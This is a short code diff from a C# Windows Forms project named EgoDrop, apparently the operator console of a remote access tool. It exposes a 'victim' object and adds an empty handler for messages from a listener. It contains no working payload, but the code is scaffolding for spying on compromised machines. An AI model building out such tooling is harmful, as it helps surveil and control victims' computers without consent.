@@ -12,13 +12,24 @@ namespace EgoDrop
 {
     public partial class frmInfoSpyder : Form
     {
-        private clsVictim m_victim { get; set; }
+        public clsVictim m_victim { get; set; }
 
         public frmInfoSpyder(clsVictim victim)
         {
             InitializeComponent();
 
             m_victim = victim;
+        }
+
+        void fnRecv(clsListener ltn, clsVictim victim, List<string> lsMsg)
+        {
+            if (!clsTools.fnbSameVictim(victim, m_victim))
+                return;
+
+            Invoke(new Action(() =>
+            {
+
+            }));
         }
 
         private void fnSetup()
